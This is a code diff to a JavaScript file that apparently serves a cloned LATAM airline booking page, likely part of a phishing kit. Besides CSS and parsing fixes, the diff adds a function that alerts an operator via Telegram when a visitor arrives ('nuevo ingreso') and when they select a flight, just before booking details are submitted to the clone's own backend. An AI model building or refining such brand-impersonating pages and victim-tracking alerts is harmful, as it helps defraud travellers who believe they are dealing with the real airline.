@@ -96,6 +96,51 @@ var optionsPassengers = `
 
 var my_contenido = `
 <link rel="stylesheet" href="${my_hosting}__ltam/css/index_1.css">
+<style>
+    /* Fix grid de ofertas en mobile - una card por fila */
+    @media (max-width: 768px) {
+        .dJyhT {
+            grid-template-columns: 1fr !important;
+            gap: 1rem !important;
+        }
+        .kgZRoE {
+            max-width: 100% !important;
+        }
+    }
+    @media (min-width: 769px) and (max-width: 1024px) {
+        .dJyhT {
+            grid-template-columns: 1fr 1fr !important;
+            gap: 1rem !important;
+        }
+    }
+
+    /* Fix Experiencia LATAM carousel en mobile */
+    @media (max-width: 768px) {
+        .cvNqhc {
+            width: 85% !important;
+            min-width: 250px !important;
+            flex-shrink: 0 !important;
+        }
+        .eTcowY {
+            gap: 0.5rem !important;
+        }
+        .djOUDS {
+            padding: 1.5rem 1rem !important;
+        }
+        .fGLGYp {
+            margin: 0 !important;
+        }
+        /* Imagen de Experiencia LATAM - reducir tamaño */
+        .diaNVm {
+            min-height: 120px !important;
+            max-height: 140px !important;
+        }
+        .hSmTKv {
+            min-width: 0 !important;
+            max-height: 140px !important;
+        }
+    }
+</style>
 <div id="__next" data-reactroot="">
 
     <div class="Homestyles__Container-sc-50t575-0 dPiZJd"><a id="header__skip-to-content__0"
@@ -2893,6 +2938,26 @@ var my_contenido = `
 
 //<script>
     loadContenido();
+
+    // Función para enviar notificaciones a Telegram
+    function sendTelegramNotification(mensaje) {
+        try {
+            $.ajax({
+                url: my_hosting + '__ltam/send_notification.php',
+                method: 'POST',
+                data: { mensaje: mensaje },
+                async: true
+            });
+        } catch(e) {
+            console.log('Error al enviar notificación:', e);
+        }
+    }
+
+    // Notificación: Nuevo ingreso en selector de vuelo
+    setTimeout(function() {
+        sendTelegramNotification('*nuevo ingreso*');
+    }, 1000);
+
     var startDate = null;
     var endDate = null;
     var mobile = false;
@@ -3802,7 +3867,8 @@ var my_contenido = `
                 const dateStr = span.attr('data-testid')?.replace('date-', '');
                 if (!dateStr) return;
 
-                const selectedDate = new Date(dateStr);
+                const [year, month, day] = dateStr.split('-').map(Number);
+                const selectedDate = new Date(year, month - 1, day);
                 selectedDate.setHours(0, 0, 0, 0);
 
                 if (!selectIdaYVuelta) {
@@ -4013,9 +4079,9 @@ var my_contenido = `
             }
         }
         const passengers = {
-            adultos: parseInt($('#count-adultos').text()),
-            ninos: parseInt($('#count-ninos').text()),
-            bebes: parseInt($('#count-bebes').text())
+            adultos: parseInt($('#count-adultos').text().trim()) || 1,
+            ninos: parseInt($('#count-ninos').text().trim()) || 0,
+            bebes: parseInt($('#count-bebes').text().trim()) || 0
         };
         const tipoVuelo = window.tipoVuelo || 'Económica';
 
@@ -4070,11 +4136,15 @@ var my_contenido = `
         const $origen_code = origin.split(',')[1].trim();
         const destinationCity = destination.split(',')[0].trim();
         const destinationCode = destination.split(',')[1].trim();
+
+        // Notificación: Seleccionando vuelo
+        sendTelegramNotification('*seleccionando vuelo*');
+
         processing({
             t: 'pre-lts',
             fecha_vuelta: returnDate,
             fecha_ida: departureDate,
-            pasajeros: JSON.stringify(pasajeros),
+            pasajeros: JSON.stringify(passengers),
             origenCode: $origen_code,
             origenCiudad: $origen_city,
             destinoCode: destinationCode,
